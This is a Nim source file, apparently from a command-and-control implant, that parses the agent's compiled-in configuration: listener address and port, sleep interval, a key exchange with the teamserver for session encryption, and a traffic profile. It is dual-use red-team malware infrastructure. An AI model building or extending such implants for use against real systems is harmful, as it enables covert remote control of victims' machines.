import parsetoml, base64, system
import ../../common/[types, utils, crypto, serialize]

const CONFIGURATION {.strdefine.}: string = ""

proc deserializeConfiguration(config: string): AgentCtx = 
    
    var unpacker = Unpacker.init(config) 

    var agentKeyPair = generateKeyPair() 

    var ctx = new AgentCtx 
    ctx.agentId = generateUUID() 
    ctx.agentPublicKey = agentKeyPair.publicKey

    while unpacker.getPosition() != config.len(): 

        let 
            configType = cast[ConfigType](unpacker.getUint8())
            length = int(unpacker.getUint32())
            data = unpacker.getBytes(length)

        case configType: 
        of CONFIG_LISTENER_UUID: 
            ctx.listenerId = Uuid.toString(Bytes.toUint32(data))
        of CONFIG_LISTENER_IP:
            ctx.ip = Bytes.toString(data)
        of CONFIG_LISTENER_PORT: 
            ctx.port = int(Bytes.toUint32(data))
        of CONFIG_SLEEP_DELAY:
            ctx.sleep = int(Bytes.toUint32(data))
        of CONFIG_PUBLIC_KEY:  
            let serverPublicKey = Bytes.toString(data).toKey()
            ctx.sessionKey = deriveSessionKey(agentKeyPair, serverPublicKey)
        of CONFIG_PROFILE: 
            ctx.profile = parseString(Bytes.toString(data))
        else: discard

    echo "[+] Profile configuration deserialized."
    return ctx

proc init*(T: type AgentCtx): AgentCtx = 

    try: 
        # The agent configuration is read at compile time using define/-d statements in nim.cfg
        # This configuration file can be dynamically generated from the teamserver management interface
        # Downside to this is obviously that readable strings, such as the listener UUID can be found in the binary
        when not defined(CONFIGURATION):
            raise newException(CatchableError, "Missing agent configuration.")

        return deserializeConfiguration(CONFIGURATION)

        # Create agent configuration
        # var agentKeyPair = generateKeyPair() 
        # let serverPublicKey = decode(ServerPublicKey).toKey() 

        # let ctx = AgentCtx(
        #     agentId: generateUUID(),
        #     listenerId: ListenerUuid,
        #     ip: address, 
        #     port: ListenerPort, 
        #     sleep: SleepDelay,
        #     sessionKey: deriveSessionKey(agentKeyPair, serverPublicKey),   # Perform key exchange to derive AES256 session key for encrypted communication
        #     agentPublicKey: agentKeyPair.publicKey,
        #     profile: parseString(decode(ProfileString))
        # )

        # # Cleanup agent's secret key
        # wipeKey(agentKeyPair.privateKey)

        # return ctx

    except CatchableError as err:
        echo "[-] " & err.msg
        return nil



